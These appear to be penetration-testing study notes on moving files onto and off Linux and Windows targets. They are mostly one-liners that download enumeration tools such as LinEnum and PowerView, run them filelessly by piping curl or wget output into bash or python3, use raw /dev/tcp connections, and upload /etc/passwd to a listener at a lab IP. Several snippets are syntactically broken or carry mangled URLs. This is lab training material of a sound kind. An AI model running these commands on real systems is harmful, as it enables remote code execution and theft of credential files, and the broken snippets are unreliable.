# Linux File Transfers
## Wget download

```bash
lemur@htb ~ $ wget https://raw.githubusercontent.com/rebootuser/LinEnum.sh -O /tmp/LinEnum.sh
```

## cURL download

```bash
lemur@htb ~ $ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum.sh
```

## Fileless attacks

Note that some payloads such as `mkfifo` write files to disk. 
Keep in mind that while the execution of the payload may be fileless when you use a pipe,
depending on the payload chosen it may create temporary files on the OS.

### Fileless downloads using cURL and Wget

```bash
curl https://raw.githubusercontent.com/rebootuser/LinEnum.sh | bash
wget -qO- https://raw.githubusercontent.com/rebootuser/helloworld.py | python3
```

### Download with bash (dev/tcp) 

Connect to target webserver:
```bash
exec 3<>/dev/tcp/10.10.10.32/80
```

HTTP GET request:
```bash
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

Print the response:
```bash
cat <&3
```

## Ultimate File Transfer List

https://github.com/egre55/ultimate-file-transfer-list

## Using Code to transfer files

Just download it:
```py
python3 -c 

import urllib.request
urllib.request.urlretrieve(
	"https://raw.githubuser.com/rebootuser/LinEnum/main/LinEnum.sh", "LinEnum.sh")

in python2.7 -c is just `import urllib; urllib.urlretrieve`
```

Just download it:
```php
php -r 
	$file = file_get_contents("
		https://raw.githubusercontent.com/rebootuser/LinEnum/main/LinEnum.sh");

	file_put_contents("LinEnum.sh", $file);
```
Pipe it to Bash:
```php
php -r 
	$lines = @file("
		https://raw.githubusercontent.com/rebootuser/LinEnum/main/LinEnum.sh");

foreach ($lines as $line_enum => $line) {
	echo $line;
	
	}' | bash
```
Use Popen:
```php
php -r 
	const BUFFER = 1024;

	$fremote = fopen("
		https://raw.githubusercontent.com/rebootuser/LinEnum/main/LinEnum.sh", "rb");
	$flocal = fopen("
		LinEnum.sh", "wb");
	
	while ($buffer = fread($fremote, BUFFER)) {
		fwrite($flocal, $buffer);
	}
	fclose($flocal);
	fclose($fremote);
```

Just download it:
```ruby
ruby -e 
	require "net/http";

	File.write("LinEnum.sh", Net::HTTP.get(URI.parse(
		"https://raw.githubusercontent.com/rebootuser/LinEnum/main/LinEnum.sh"
		)
	)
)
```

Just download it:
```perl
perl -e
	use LWP::Simple;
	getstore("https://raw.githubusercontent.com/LinEnum/main/LinEnum.sh", "LinEnum.sh");
```

Scripting using JavaScript:
```js
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");

WinHttpReq.Open("GET", Wscript.Arguments(0), /*async=*/false);
WinHttpReq.Send();

BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

Run the JS in Windows:
```PS
C:\> cscript.exe \nologo wget.js 
	https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 
	to: PowerView.ps1
```

Wget.vbs:
```vbs
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")

xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
	.type = 1
	.open
	.write xHttp.responsebody
	.savetofile WScript.Arguments.Item(1), 2
end with
```

## Upload files with Code

```py
python3 -m uploadserver
```
```py
python3 -c 
	import requests;
	requests.post(
		"http://192.168.49.128:8000/upload",files={
		"files":open("/etc/passwd","rb")
		}
	)
```